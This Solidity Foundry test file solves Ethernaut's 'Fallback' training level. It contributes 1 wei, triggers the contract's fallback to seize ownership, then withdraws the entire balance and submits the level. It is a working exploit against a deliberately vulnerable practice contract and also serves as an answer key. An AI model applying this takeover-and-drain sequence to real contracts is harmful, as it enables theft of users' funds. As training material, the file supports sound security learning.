pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/01-Fallback/FallbackFactory.sol';
import '../core/Ethernaut.sol';

contract FallbackTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testFallbackHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    FallbackFactory fallbackFactory = new FallbackFactory();
    ethernaut.registerLevel(fallbackFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
    Fallback fallbackContract = Fallback(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------
    fallbackContract.contribute{ value: 1 wei }();

    emit log_named_uint(
      'Verify contribution state change: ',
      fallbackContract.getContribution()
    );

    payable(address(fallbackContract)).call{ value: 1 wei }(''); // Trigger `fallback()`
    assertEq(fallbackContract.owner(), attacker);

    emit log_named_uint(
      'Contract balance (before): ',
      address(fallbackContract).balance
    );
    emit log_named_uint('Attacker balance (before): ', attacker.balance);

    fallbackContract.withdraw(); // Empty smart contract funds
    assertEq(address(fallbackContract).balance, 0);

    emit log_named_uint(
      'Contract balance (after): ',
      address(fallbackContract).balance
    );
    emit log_named_uint('Attacker balance (after): ', attacker.balance);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}
